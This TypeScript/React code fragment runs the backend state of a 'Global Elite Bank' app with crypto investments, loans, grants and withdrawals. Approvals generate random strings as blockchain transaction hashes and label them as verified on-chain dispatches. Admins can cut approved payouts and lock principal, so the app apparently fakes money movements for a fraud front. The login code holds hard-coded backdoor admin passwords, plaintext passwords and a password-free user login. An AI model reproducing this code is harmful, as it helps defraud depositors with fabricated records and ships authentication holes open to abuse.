  useEffect(() => { syncTable(cryptoWithdrawals, 'crypto_withdrawal_requests', 'cryptoWithdrawals'); }, [cryptoWithdrawals, isInitializing]);
  useEffect(() => { syncTable(cryptoOrders, 'crypto_trade_orders', 'cryptoOrders'); }, [cryptoOrders, isInitializing]);

  useEffect(() => {
    if (isInitializing || !adminSettings.id) return;
    const prevSettings = prevStates.current.adminSettings;
    if (!prevSettings || JSON.stringify(prevSettings) !== JSON.stringify(adminSettings)) {
      supabase.from('admin_settings').upsert(camelToSnake(adminSettings)).then();
      prevStates.current.adminSettings = JSON.parse(JSON.stringify(adminSettings));
    }
  }, [adminSettings, isInitializing]);

  
  // Ensure mizbryo@gmail.com is set in admin settings if older settings existed
  useEffect(() => {
    if (adminSettings.adminEmail === 'mizbrymo@gmail.com') {
      setAdminSettings(prev => ({ ...prev, adminEmail: 'mizbryo@gmail.com', adminPassword: '12345' }));
    }
  }, [adminSettings.adminEmail]);

                        
  // Unified data management service for cross-tab synchronization
  useEffect(() => {
    const handleStorageChange = (e: StorageEvent) => {
      try {
        if (e.key === 'bank_users' && e.newValue) setUsers(sanitizeUsers(JSON.parse(e.newValue)));
        if (e.key === 'bank_currentUser' && e.newValue) setCurrentUser(JSON.parse(e.newValue));
        if (e.key === 'bank_transactions' && e.newValue) setTransactions(JSON.parse(e.newValue));
        if (e.key === 'bank_virtualCards' && e.newValue) setVirtualCards(JSON.parse(e.newValue));
        if (e.key === 'bank_loanApplications' && e.newValue) setLoanApplications(JSON.parse(e.newValue));
        if (e.key === 'bank_userApplications' && e.newValue) setUserApplications(JSON.parse(e.newValue));
        if (e.key === 'bank_grantApplications' && e.newValue) setGrantApplications(JSON.parse(e.newValue));
        if (e.key === 'bank_contactInquiries' && e.newValue) setContactInquiries(JSON.parse(e.newValue));
        if (e.key === 'bank_adminSettings' && e.newValue) {
          const parsed = JSON.parse(e.newValue);
          setAdminSettings(prev => ({
            ...prev,
            ...parsed,
            brokerWallets: {
              ...DEFAULT_BROKER_WALLETS,
              ...(prev.brokerWallets || {}),
              ...(parsed.brokerWallets || {})
            },
            fiatDepositInstructions: {
              ...(prev.fiatDepositInstructions || {}),
              ...(parsed.fiatDepositInstructions || {})
            },
            eWalletInstructions: {
              ...(prev.eWalletInstructions || {}),
              ...(parsed.eWalletInstructions || {})
            }
          }));
        }
        if (e.key === 'bank_investments' && e.newValue) setInvestments(JSON.parse(e.newValue));
        if (e.key === 'bank_crypto_withdrawals' && e.newValue) setCryptoWithdrawals(JSON.parse(e.newValue));
        if (e.key === 'bank_crypto_orders' && e.newValue) setCryptoOrders(JSON.parse(e.newValue));
      } catch (err) {
        console.error("Error syncing data from storage", err);
      }
    };
    
    window.addEventListener('storage', handleStorageChange);
    return () => window.removeEventListener('storage', handleStorageChange);
  }, []);


  const login = (email: string, password?: string, isAdminPath?: boolean) => {
    const inputEmail = (email || '').trim().toLowerCase();
    const configuredAdminEmail = (adminSettings?.adminEmail || 'mizbryo@gmail.com').trim().toLowerCase();

    // Check if logging in as Super Admin (mizbryo@gmail.com or configured admin email or simply "admin")
    if (inputEmail === 'admin' || inputEmail === 'mizbryo@gmail.com' || inputEmail === configuredAdminEmail || inputEmail === 'mizbrymo@gmail.com') {
      const isValidPassword = password === 'admin' || password === '12345' || password === adminSettings?.adminPassword;
      if (isValidPassword) {
        let adminUser = users.find(u => u.role === 'admin' && (u.email?.toLowerCase() === inputEmail || u.email?.toLowerCase() === 'mizbryo@gmail.com'));
        if (!adminUser) {
          adminUser = {
            id: 'admin-1',
            name: 'Super Admin',
            email: 'mizbryo@gmail.com',
            password: '12345',
            role: 'admin',
            status: 'active',
            accounts: [],
            showFullCardDetails: true
          };
          setUsers(prev => [adminUser!, ...prev.filter(u => u.id !== 'admin-1' && u.email?.toLowerCase() !== 'mizbryo@gmail.com')]);
        }
        setCurrentUser(adminUser);
        return { success: true };
      }
      return { success: false, error: 'Invalid admin credentials' };
    }

    // Check other registered admins
    const matchedAdmin = users.find(u => u.role === 'admin' && u.email?.toLowerCase() === inputEmail);
    if (matchedAdmin) {
      if (password === matchedAdmin.password || password === '12345') {
        setCurrentUser(matchedAdmin);
        return { success: true };
      }
      return { success: false, error: 'Invalid admin credentials' };
    }

    if (isAdminPath) {
       return { success: false, error: 'You do not have administrator access.' };
    }
    
    // Normal user login
    const user = users.find(u => u.email === email && u.role !== 'admin' && (password ? u.password === password : true));
    if (user) {
      if (user.status !== 'active') {
        const msg = user.status === 'inactive' ? 'Your account is inactive. Please contact Support or Admin.' :
                    user.status === 'dormant' ? 'Your account is currently dormant. Please kindly contact Support/Admin to reactivate.' :
                    user.status === 'suspended' ? 'Your account has been suspended. Please kindly contact Support/Admin.' :
                    `Your account has been ${user.status}. Please kindly contact Support/Admin.`;
        return { success: false, error: msg };
      }
      setCurrentUser(user);
      return { success: true };
    }
    return { success: false, error: 'Invalid email or password' };
  };

  const logout = () => setCurrentUser(null);

  const loginAsAdmin = () => {
    let adminUser = users.find(u => u.role === 'admin' && (u.email?.toLowerCase() === 'mizbryo@gmail.com' || u.email?.toLowerCase() === (adminSettings?.adminEmail || '').toLowerCase()));
    if (!adminUser) {
      adminUser = users.find(u => u.role === 'admin') || defaultAdmin;
    }
    setCurrentUser(adminUser);
    return adminUser;
  };

  const generateRandomCode = (prefix: string, length: number) => {
    return prefix + Math.floor(Math.random() * Math.pow(10, length)).toString().padStart(length, '0');
  };


  const adminCreateUser = (userData: Omit<User, "id">) => {
    // If client, ensure they have at least one valid bank account created
    if (userData.role !== 'admin') {
      if (!userData.accounts || !Array.isArray(userData.accounts) || userData.accounts.length === 0) {
        console.warn('Cannot create client without bank accounts');
        return;
      }
      const hasValidAcc = userData.accounts.some(a => Boolean(a?.accountNumber && a.accountNumber.trim()));
      if (!hasValidAcc) {
        console.warn('Cannot create client without valid account number');
        return;
      }
    }

    setUsers(prev => {
      // Deduplicate by email
      const emailKey = (userData.email || '').trim().toLowerCase();
      const existingIdx = prev.findIndex(u => (u.email || '').trim().toLowerCase() === emailKey);

      if (existingIdx !== -1) {
        // User already exists; update details and merge any non-duplicate bank accounts
        const existingUser = prev[existingIdx];
        const existingAccounts = existingUser.accounts || [];
        const incomingAccounts = userData.accounts || [];

        const mergedAccounts = [...existingAccounts];
        for (const incAcc of incomingAccounts) {
          if (!incAcc || !incAcc.accountNumber) continue;
          const accExists = mergedAccounts.some(a => 
            a.accountNumber?.trim() === incAcc.accountNumber?.trim() || a.id === incAcc.id
          );
          if (!accExists) {
            mergedAccounts.push(incAcc);
          }
        }

        const updatedUser: User = {
          ...existingUser,
          ...userData,
          id: existingUser.id,
          accounts: mergedAccounts
        };

        const next = [...prev];
        next[existingIdx] = updatedUser;
        return next;
      }

      // Check if any incoming account number is already registered to another user to avoid duplicates
      const incomingAccNums = (userData.accounts || []).map(a => a.accountNumber?.trim()).filter(Boolean);
      const isAccNumTaken = prev.some(u => 
        (u.accounts || []).some(a => incomingAccNums.includes(a.accountNumber?.trim()))
      );

      if (isAccNumTaken) {
        console.warn('Account number already belongs to an existing client. Duplicate prevented.');
        return prev;
      }

      const newUser: User = {
        ...userData,
        id: `user-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`,
        newAccountPromptPending: true,
        accountOpenedAt: new Date().toISOString()
      };
      return [...prev, newUser];
    });
  };

  const register = (name: string, email: string, password?: string) => {
    const newApp: UserApplication = {
      id: `app-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`,
      name,
      email,
      password,
      date: new Date().toISOString(),
      status: 'pending'
    };
    setUserApplications(prev => [...prev, newApp]);
    
    // Automatic email mock
    setTimeout(() => {
      setMockEmail({ to: email, subject: "Application Under Review", body: `Dear ${name},

Your application for membership is currently being reviewed by our Membership Committee. You will receive another update within 2–5 business days.`});
    }, 500);
  };

  const adminUpdateUser = (userId: string, updates: Partial<User>) => {
    setUsers(prev => prev.map(u => u.id === userId ? { ...u, ...updates } : u));
    setCurrentUser(prev => (prev && prev.id === userId ? { ...prev, ...updates } : prev));
  };

  const updateUserStatus = (userId: string, status: UserStatus) => {
    setUsers(prev => prev.map(u => u.id === userId ? { ...u, status } : u));
  };

  const deleteUser = (userId: string) => {
    setUsers(prev => prev.filter(u => u.id !== userId));
  };

  const updateUserCardVisibility = (userId: string, show: boolean) => {
    setUsers(prev => prev.map(u => u.id === userId ? { ...u, showFullCardDetails: show } : u));
  };

  const updateBalance = (userId: string, accountId: string, amount: number) => {
    // Strictly isolate fiat bank accounts: never update fiat bank balance for crypto wallet actions
    if (!accountId || accountId === 'crypto-wallet' || String(accountId).toLowerCase().startsWith('crypto')) {
      return;
    }
    setUsers(prev => prev.map(u => {
      if (u.id === userId) {
        return {
          ...u,
          accounts: u.accounts.map(a => a.id === accountId ? { ...a, balance: a.balance + amount } : a)
        };
      }
      return u;
    }));
  };

  const updateAdminSettings = (newSettings: Partial<AdminSettings>) => {
    setAdminSettings(prev => {
      const mergedFrontend = newSettings.frontendContent
        ? { ...DEFAULT_FRONTEND_CONTENT, ...(prev.frontendContent || {}), ...newSettings.frontendContent }
        : prev.frontendContent;
      const updated: AdminSettings = {
        ...prev,
        ...newSettings,
        ...(mergedFrontend ? { frontendContent: mergedFrontend } : {})
      };
      try {
        window.localStorage.setItem('bank_adminSettings', JSON.stringify(updated));
      } catch (e) {
        console.error("Error saving bank_adminSettings to localStorage:", e);
      }
      return updated;
    });
  };
  
  const createVirtualCard = (card: Omit<VirtualCard, 'id'>) => {
    const newCard: VirtualCard = { ...card, id: `card-${Date.now()}-${Math.random().toString(36).substring(2, 9)}` };
    setVirtualCards(prev => [newCard, ...prev]);
  };
  
  const updateVirtualCardStatus = (cardId: string, status: VirtualCard['status']) => {
    setVirtualCards(prev => prev.map(c => c.id === cardId ? { ...c, status } : c));
  };

  const deleteVirtualCard = (cardId: string) => {
    setVirtualCards(prev => prev.filter(c => c.id !== cardId));
  };

  const createLoanApplication = (loan: Omit<LoanApplication, 'id' | 'date'>) => {
    const newLoan: LoanApplication = { ...loan, id: `loan-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`, date: new Date().toISOString() };
    setLoanApplications(prev => [newLoan, ...prev]);
  };

  const updateLoanApplicationStatus = (loanId: string, status: LoanApplication['status']) => {
    const loan = loanApplications.find(l => l.id === loanId);
    if (loan && loan.status !== 'approved' && status === 'approved') {
      const user = users.find(u => u.id === loan.userId);
      const fiatAccount = user?.accounts?.[0]; // Target the primary checking account
      if (fiatAccount) {
        // Schedule transaction creation in next tick to avoid side-effects during render cycle
        setTimeout(() => {
          createTransaction({
            userId: loan.userId,
            accountId: fiatAccount.id,
            amount: loan.amount,
            type: 'deposit',
            status: 'completed',
            recipientDetails: {
              name: 'Global Elite Bank Credit',
              bank: 'Global Elite Internal Transfer',
              remarks: `Approved Loan Disbursement (Ref: ${loan.id})`
            }
          });
        }, 100);
      }
    }
    setLoanApplications(prev => prev.map(l => l.id === loanId ? { ...l, status } : l));
  };

  const updateUserApplicationStatus = (appId: string, status: UserApplication['status'], customData?: Omit<User, 'id'>) => {
    // 1. First find the app outside the state setter to avoid calling side-effects inside setState
    const app = userApplications.find(a => a.id === appId);
    
    if (app) {
      setTimeout(() => {
        if (status === 'approved') {
          setMockEmail({
            to: app.email,
            subject: "🎉 Congratulations! Your Global Elite Bank Application has been Approved",
            body: `Dear ${app.name},

Congratulations! We are delighted to inform you that your application for an exclusive private banking account with Global Elite Bank has been officially APPROVED.

Your private client profile is currently being provisioned with multi-currency capabilities, VIP security clearance credentials, and premier wealth management access.

Welcome to Global Elite Bank.

Warm regards,
Admissions & Compliance Directorate
Global Elite Bank, Zurich, Switzerland`
          });
        } else if (status === 'rejected') {
          setMockEmail({
            to: app.email,
            subject: "Notice Regarding Your Application - Global Elite Bank",
            body: `Dear ${app.name},

Thank you for your interest in establishing a private banking relationship with Global Elite Bank.

Following a thorough assessment by our Admissions & Compliance Committee, we regret to inform you that your application could not be approved at this time under our current institutional onboarding guidelines and jurisdictional criteria.

We thank you for considering Global Elite Bank and wish you continued success.

Sincerely,
Admissions & Compliance Directorate
Global Elite Bank, Zurich, Switzerland`
          });
        }
      }, 300);

      if (status === 'approved' && customData) {
        adminCreateUser(customData);
      }
    }
    
    // 2. Then update the applications state cleanly
    setUserApplications(prev => prev.map(a => a.id === appId ? { ...a, status } : a));
  };

  const createGrantApplication = (grant: Omit<GrantApplication, 'id' | 'date'>) => {
    const newGrant: GrantApplication = { ...grant, id: `grant-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`, date: new Date().toISOString() };
    setGrantApplications(prev => [newGrant, ...prev]);
  };

  const updateGrantApplicationStatus = (grantId: string, status: GrantApplication['status']) => {
    const grant = grantApplications.find(g => g.id === grantId);
    if (grant && grant.status !== 'disbursed' && status === 'disbursed') {
      const user = users.find(u => u.id === grant.userId);
      const fiatAccount = user?.accounts?.[0];
      if (fiatAccount) {
        setTimeout(() => {
          createTransaction({
            userId: grant.userId,
            accountId: fiatAccount.id,
            amount: grant.amount,
            type: 'deposit',
            status: 'completed',
            recipientDetails: {
              name: 'Global Elite Foundation Grant',
              bank: 'Global Elite Internal Transfer',
              remarks: `Grant Disbursement (Ref: ${grant.id})`
            }
          });
        }, 100);
      }
    }
    setGrantApplications(prev => prev.map(g => g.id === grantId ? { ...g, status } : g));
  };

  const createContactInquiry = (inquiry: Omit<ContactInquiry, 'id' | 'date'>) => {
    const newInquiry: ContactInquiry = {
      ...inquiry,
      id: `inquiry-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`,
      date: new Date().toISOString(),
      status: 'new'
    };
    setContactInquiries(prev => [newInquiry, ...prev]);
  };

  const deleteContactInquiry = (inquiryId: string) => {
    setContactInquiries(prev => prev.filter(inq => inq.id !== inquiryId));
  };

  const updateContactInquiryStatus = (inquiryId: string, status: 'new' | 'replied' | 'ignored', replyDetails?: { subject: string; message: string }) => {
    setContactInquiries(prev => prev.map(inq => {
      if (inq.id === inquiryId) {
        return {
          ...inq,
          status,
          ...(replyDetails ? {
            replySubject: replyDetails.subject,
            replyMessage: replyDetails.message,
            repliedAt: new Date().toISOString()
          } : {})
        };
      }
      return inq;
    }));
  };

  const sendMockEmail = (email: { to: string; subject: string; body: string }) => {
    setMockEmail(email);
  };


  const createInvestment = (inv: Omit<Investment, 'id'> | (Omit<Investment, 'id' | 'startDate' | 'endDate' | 'status'> & Partial<Investment>)) => {
    const startDate = (inv as any).startDate ? new Date((inv as any).startDate) : new Date();
    const endDate = (inv as any).endDate ? new Date((inv as any).endDate) : new Date(startDate.getTime() + (inv.durationDays || 7) * 86400000);
    
    const newInv: Investment = {
      amount: inv.amount,
      currency: inv.currency,
      durationDays: inv.durationDays,
      txHash: inv.txHash,
      userId: inv.userId,
      id: `inv-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`,
      startDate: startDate.toISOString(),
      endDate: endDate.toISOString(),
      status: (inv as any).status || 'pending',
      profit: (inv as any).profit,
      isPrincipalLocked: (inv as any).isPrincipalLocked ?? true,
      adminApprovedDuration: (inv as any).adminApprovedDuration ?? true,
      reinvestedFromProfit: (inv as any).reinvestedFromProfit ?? false,
      adminNotes: (inv as any).adminNotes
    };
    setInvestments(prev => [newInv, ...prev]);
  };
  
  const updateInvestment = (id: string, updates: Partial<Investment>) => {
    setInvestments(prev => prev.map(inv => inv.id === id ? { ...inv, ...updates } : inv));
  };

  const deleteInvestment = (id: string) => {
    setInvestments(prev => prev.filter(inv => inv.id !== id));
  };

  const reinvestProfit = (params: {
    userId: string;
    amount: number;
    currency: string;
    durationDays: number;
  }): { success: boolean; message: string; investment?: Investment } => {
    const user = users.find(u => u.id === params.userId);
    if (!user) return { success: false, message: 'User not found.' };

    const currentProfitBalance = user.investorWallets?.balance || 0;
    if (params.amount <= 0) {
      return { success: false, message: 'Please enter a valid profit amount to reinvest.' };
    }
    if (params.amount > currentProfitBalance) {
      return { 
        success: false, 
        message: `Reinvestment amount ($${params.amount.toLocaleString()} USD) exceeds available profit balance ($${currentProfitBalance.toLocaleString()} USD).` 
      };
    }

    // Deduct reinvested amount from user's available profit balance
    const updatedBalance = Math.max(0, currentProfitBalance - params.amount);
    adminUpdateUser(user.id, {
      investorWallets: {
        ...user.investorWallets,
        balance: updatedBalance
      } as any
    });

    // Compute equivalent crypto amount based on institutional reference price
    const rates: Record<string, number> = {
      USDT: 1.0,
      BTC: 65100.0,
      ETH: 3420.5,
      SOL: 145.2,
      BNB: 580.4,
      XRP: 0.62
    };
    const rate = rates[params.currency] || 1.0;
    const cryptoAmount = +(params.amount / rate).toFixed(6);

    const startDate = new Date();
    const endDate = new Date(startDate.getTime() + params.durationDays * 86400000);
    const newInv: Investment = {
      id: `inv-reinvest-${Date.now()}-${Math.random().toString(36).substring(2, 6)}`,
      userId: user.id,
      amount: cryptoAmount,
      currency: params.currency,
      durationDays: params.durationDays,
      startDate: startDate.toISOString(),
      endDate: endDate.toISOString(),
      status: 'active',
      isPrincipalLocked: true,
      adminApprovedDuration: true,
      reinvestedFromProfit: true,
      txHash: `0x${Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join('')}`,
      profit: 0,
      adminNotes: `Reinvested profit of $${params.amount.toLocaleString()} USD. Principal locked for ${params.durationDays} days.`
    };

    setInvestments(prev => [newInv, ...prev]);

    // Record completed transaction
    createTransaction({
      userId: user.id,
      accountId: 'crypto-wallet',
      amount: params.amount,
      type: 'crypto_deposit',
      status: 'completed',
      description: `Profit Reinvestment into ${params.durationDays}-Day ${params.currency} Stake (Principal Locked)`,
      recipientDetails: {
        network: params.currency,
        txHash: newInv.txHash,
        remarks: `Profit reinvested into institutional stake. Principal locked for ${params.durationDays} days approved by Admin.`
      }
    });

    return {
      success: true,
      message: `Successfully reinvested $${params.amount.toLocaleString()} USD into a ${params.durationDays}-day ${params.currency} contract. Principal is locked for ${params.durationDays} days.`,
      investment: newInv
    };
  };

  const adminAdjustInvestmentDuration = (investmentId: string, newDurationDays: number, adminNotes?: string) => {
    setInvestments(prev => prev.map(inv => {
      if (inv.id === investmentId) {
        const start = new Date(inv.startDate).getTime();
        const newEnd = new Date(start + newDurationDays * 86400000).toISOString();
        return {
          ...inv,
          durationDays: newDurationDays,
          endDate: newEnd,
          adminApprovedDuration: true,
          adminNotes: adminNotes || `Duration set to ${newDurationDays} days approved by Administrator.`
        };
      }
      return inv;
    }));
  };
  
  const createTransaction = (txn: Omit<Transaction, 'id' | 'date'>) => {
    const newTxn: Transaction = {
      ...txn,
      id: `txn-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`,
      date: new Date().toISOString(),
    };
    setTransactions(prev => [newTxn, ...prev]);
    
    // Also update balance if completed (strictly for fiat accounts, never for crypto transactions)
    if (newTxn.status === 'completed') {
      const isCryptoTxn = 
        txn.accountId === 'crypto-wallet' || 
        String(txn.accountId).toLowerCase().startsWith('crypto') ||
        String(txn.type).startsWith('crypto_');

      if (!isCryptoTxn) {
        if (txn.type === 'deposit') {
          updateBalance(txn.userId, txn.accountId, txn.amount);
        } else {
          updateBalance(txn.userId, txn.accountId, -txn.amount);
        }
      }
    }
  };

  const updateTransactionStatus = (txId: string, status: 'pending' | 'completed' | 'failed') => {
    setTransactions(prev => prev.map(t => {
      if (t.id === txId) {
        const isCryptoTxn = 
          t.accountId === 'crypto-wallet' || 
          String(t.accountId).toLowerCase().startsWith('crypto') ||
          String(t.type).startsWith('crypto_');

        // If status changed from pending to completed, apply balance change
        if (t.status !== 'completed' && status === 'completed' && !isCryptoTxn) {
          if (t.type === 'deposit') {
            updateBalance(t.userId, t.accountId, t.amount);
          } else {
            updateBalance(t.userId, t.accountId, -t.amount);
          }
        }
        // If status changed from completed to anything else, revert balance change
        if (t.status === 'completed' && status !== 'completed' && !isCryptoTxn) {
           if (t.type === 'deposit') {
            updateBalance(t.userId, t.accountId, -t.amount);
          } else {
            updateBalance(t.userId, t.accountId, t.amount);
          }
        }
        return { ...t, status };
      }
      return t;
    }));
  };


  const updateUserProfilePicture = (url: string) => {
    if (!currentUser) return;
    setUsers(prev => prev.map(u => u.id === currentUser.id ? { ...u, profilePicture: url } : u));
    setCurrentUser({ ...currentUser, profilePicture: url });
  };

  const requestCryptoWithdrawal = (req: Omit<CryptoWithdrawalRequest, 'id' | 'requestDate' | 'status'>): { success: boolean; message: string; request?: CryptoWithdrawalRequest } => {
    const currentLimit = adminSettings?.maxCryptoWithdrawalLimit || 25000;
    if (req.amount < 100) {
      return {
        success: false,
        message: 'Minimum crypto withdrawal amount is $100.00 USD. Requests below $100 cannot be processed.'
      };
    }
    if (req.amount > currentLimit) {
      return {
        success: false,
        message: `Withdrawal request of $${req.amount.toLocaleString()} exceeds the maximum allowed limit of $${currentLimit.toLocaleString()} configured by the administrator.`
      };
    }

    const newReq: CryptoWithdrawalRequest = {
      ...req,
      id: `cw-${Date.now()}-${Math.floor(1000 + Math.random() * 9000)}`,
      requestDate: new Date().toISOString(),
      status: 'pending',
      receiptNumber: `GEB-CRYPTO-REC-${Math.floor(10000 + Math.random() * 90000)}`
    };

    setCryptoWithdrawals(prev => [newReq, ...prev]);

    // Crypto withdrawals strictly belong to the isolated crypto-wallet, never to bank checking accounts
    const accountId = 'crypto-wallet';

    createTransaction({
      userId: req.userId,
      accountId,
      amount: req.amount,
      type: 'crypto_withdrawal' as any,
      status: 'pending',
      recipientDetails: {
        name: `${req.currency} Digital Asset Withdrawal (${req.network})`,
        account: req.walletAddress,
        bank: 'Blockchain Digital Asset Vault',
        country: 'Global Distributed Ledger',
        remarks: `Crypto Withdrawal Request (${req.cryptoAmount} ${req.currency} via ${req.network}) - Ref: ${newReq.id}`
      }
    });

    return {
      success: true,
      message: 'Withdrawal request submitted successfully. Pending Admin approval.',
      request: newReq
    };
  };

  const approveCryptoWithdrawal = (withdrawalId: string, options?: { 
    approvedBy?: string; 
    customTxHash?: string; 
    adminNotes?: string;
    approvedAmount?: number;
    approvedCryptoAmount?: number;
  }): CryptoWithdrawalRequest | undefined => {
    let approvedReq: CryptoWithdrawalRequest | undefined;
    setCryptoWithdrawals(prev => prev.map(item => {
      if (item.id === withdrawalId) {
        const finalAmount = (options?.approvedAmount !== undefined && options.approvedAmount > 0)
          ? options.approvedAmount
          : item.amount;
        const originalRequested = item.amount;
        const finalCryptoAmount = (options?.approvedCryptoAmount !== undefined && options.approvedCryptoAmount > 0)
          ? options.approvedCryptoAmount
          : (item.cryptoAmount && item.amount > 0 ? +(item.cryptoAmount * (finalAmount / item.amount)).toFixed(6) : item.cryptoAmount);

        const generatedTxHash = options?.customTxHash?.trim() || `0x${Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join('')}`;
        const approvalDate = new Date().toISOString();
        const receiptNumber = item.receiptNumber || `GEB-CRYPTO-REC-${Math.floor(10000 + Math.random() * 90000)}`;

        const user = users.find(u => u.id === item.userId);
        if (user && user.investorWallets && (item.sourceWallet === 'investor' || !item.sourceWallet)) {
          // Debit the actual admin-approved finalAmount from user's investor wallet balance
          const newBal = Math.max(0, (user.investorWallets.balance || 0) - finalAmount);
          adminUpdateUser(item.userId, {
            investorWallets: {
              ...user.investorWallets,
              balance: newBal
            } as any
          });
        }

        setTransactions(tList => tList.map(t => {
          if (t.userId === item.userId && (t.recipientDetails?.remarks?.includes(item.id) || (t.amount === item.amount && t.status === 'pending' && t.type === 'crypto_withdrawal'))) {
            return {
              ...t,
              amount: finalAmount,
              status: 'completed',
              recipientDetails: {
                ...t.recipientDetails,
                txHash: generatedTxHash,
                receiptNumber,
                approvalDate,
                remarks: `Crypto Withdrawal Cleared ($${finalAmount.toLocaleString()} USD approved by Admin${finalAmount !== originalRequested ? ` - Orig: $${originalRequested.toLocaleString()}` : ''})`
              }
            };
          }
          return t;
        }));

        approvedReq = {
          ...item,
          amount: finalAmount,
          cryptoAmount: finalCryptoAmount,
          originalRequestedAmount: finalAmount !== originalRequested ? originalRequested : item.originalRequestedAmount,
          originalRequestedCryptoAmount: finalAmount !== originalRequested ? item.cryptoAmount : item.originalRequestedCryptoAmount,
          status: 'approved',
          approvalDate,
          txHash: generatedTxHash,
          receiptNumber,
          adminNotes: options?.adminNotes || item.adminNotes || (finalAmount !== originalRequested 
            ? `Admin approved adjusted payout of $${finalAmount.toLocaleString()} USD (originally requested $${originalRequested.toLocaleString()} USD). Payout credited to receiving wallet.`
            : 'Approved by compliance officer. On-chain dispatch verified.')
        };
        return approvedReq;
      }
      return item;
    }));
    return approvedReq;
  };

  const rejectCryptoWithdrawal = (withdrawalId: string, reason?: string) => {
    setCryptoWithdrawals(prev => prev.map(item => {
      if (item.id === withdrawalId) {
        setTransactions(tList => tList.map(t => {
          if (t.userId === item.userId && t.recipientDetails?.remarks?.includes(item.id)) {
            return { ...t, status: 'failed' };
          }
          return t;
        }));

        return {
          ...item,
          status: 'rejected',
          adminNotes: reason || 'Rejected by administrator policy.'
        };
      }
      return item;
    }));
  };

  const requestCryptoTradeOrder = (order: Omit<CryptoTradeOrder, 'id' | 'status' | 'requestDate' | 'receiptNumber'>): { success: boolean; message: string; order?: CryptoTradeOrder } => {
    const user = users.find(u => u.id === order.userId);
    const account = user?.accounts?.[0];

    // Balance check for Buy order
    if (order.orderType === 'buy' && account && account.balance < order.fiatAmount) {
      return {
        success: false,
        message: `Insufficient USD account balance. Available: $${account.balance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}, Required: $${order.fiatAmount.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
      };
    }

    const newOrder: CryptoTradeOrder = {
      ...order,
      id: `ct-${Date.now()}-${Math.floor(1000 + Math.random() * 9000)}`,
      requestDate: new Date().toISOString(),
      status: 'pending',
      receiptNumber: `GEB-TRADE-${Math.floor(10000 + Math.random() * 90000)}`
    };

    setCryptoOrders(prev => [newOrder, ...prev]);

    // Create a linked pending transaction
    createTransaction({
      userId: order.userId,
      accountId: account?.id || 'crypto-trading-desk',
      amount: order.fiatAmount,
      type: (order.orderType === 'buy' ? 'crypto_buy' : 'crypto_sell') as any,
      status: 'pending',
      recipientDetails: {
        name: `Quick Trade ${order.orderType.toUpperCase()} ${order.cryptoAmount} ${order.cryptoCurrency}`,
        account: `${order.cryptoAmount} ${order.cryptoCurrency} @ $${order.exchangeRate.toLocaleString()}`,
        bank: 'Swiss Digital Assets & Forex Vault',
        country: 'Global Distributed Ledger',
        remarks: `Quick Trade ${order.orderType.toUpperCase()} Order (${order.cryptoAmount} ${order.cryptoCurrency} for $${order.fiatAmount.toLocaleString()} USD) - Ref: ${newOrder.id}`,
        orderRef: newOrder.id,
        orderType: order.orderType,
        cryptoCurrency: order.cryptoCurrency,
        cryptoAmount: order.cryptoAmount,
        exchangeRate: order.exchangeRate,
        receiptNumber: newOrder.receiptNumber
      }
    });

    return {
      success: true,
      message: `Your ${order.orderType.toUpperCase()} order for ${order.cryptoAmount} ${order.cryptoCurrency} ($${order.fiatAmount.toLocaleString()} USD) has been submitted for Admin approval.`,
      order: newOrder
    };
  };

  const approveCryptoTradeOrder = (orderId: string, options?: { approvedBy?: string; customTxHash?: string }): CryptoTradeOrder | undefined => {
    let approvedOrder: CryptoTradeOrder | undefined;

    setCryptoOrders(prev => prev.map(item => {
      if (item.id === orderId) {
        const generatedTxHash = options?.customTxHash?.trim() || `0x${Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join('')}`;
        const approvalDate = new Date().toISOString();
        const receiptNumber = item.receiptNumber || `GEB-TRADE-${Math.floor(10000 + Math.random() * 90000)}`;

        approvedOrder = {
          ...item,
          status: 'approved',
          approvalDate,
          approvedBy: options?.approvedBy || 'Compliance & Digital Asset Admin',
          txHash: generatedTxHash,
          receiptNumber
        };

        // Balance settlements upon Admin approval
        const user = users.find(u => u.id === item.userId);
        if (user) {
          const account = user.accounts?.[0];
          if (item.orderType === 'buy') {
            // Debit USD from account
            if (account) {
              updateBalance(item.userId, account.id, -item.fiatAmount);
            }
            // Credit user's investorWallets balance in USD equivalent
            const currentInvestorBal = user.investorWallets?.balance || 0;
            adminUpdateUser(item.userId, {
              investorWallets: {
                ...(user.investorWallets || { btc: '', eth: '', usdt: '', sol: '', balance: 0 }),
                balance: currentInvestorBal + item.fiatAmount
              }
            });
          } else {
            // Sell: Credit USD to user account
            if (account) {
              updateBalance(item.userId, account.id, item.fiatAmount);
            }
            // Debit from investorWallets if applicable
            const currentInvestorBal = user.investorWallets?.balance || 0;
            adminUpdateUser(item.userId, {
              investorWallets: {
                ...(user.investorWallets || { btc: '', eth: '', usdt: '', sol: '', balance: 0 }),
                balance: Math.max(0, currentInvestorBal - item.fiatAmount)
              }
            });
          }
        }

        // Update corresponding transaction to completed
        setTransactions(tList => tList.map(t => {
          if (t.userId === item.userId && (t.recipientDetails?.remarks?.includes(item.id) || t.recipientDetails?.orderRef === item.id || (t.amount === item.fiatAmount && t.status === 'pending' && (t.type === 'crypto_buy' || t.type === 'crypto_sell' || t.type === 'crypto_trade')))) {
            return {
              ...t,
              status: 'completed',
              recipientDetails: {
                ...t.recipientDetails,
                txHash: generatedTxHash,
                receiptNumber,
                approvalDate
              }
            };
          }
          return t;
        }));

        return approvedOrder;
      }
      return item;
    }));

    return approvedOrder;
  };

  const rejectCryptoTradeOrder = (orderId: string, reason?: string) => {
    setCryptoOrders(prev => prev.map(item => {
      if (item.id === orderId) {
        return {
          ...item,
          status: 'rejected',
          notes: reason || 'Order rejected by Risk & Compliance Administrator'
        };
      }
      return item;
    }));

    // Update corresponding transaction to failed
    setTransactions(tList => tList.map(t => {
      if (t.recipientDetails?.remarks?.includes(orderId) || t.recipientDetails?.orderRef === orderId) {
        return { ...t, status: 'failed' };
      }
      return t;
    }));
  };

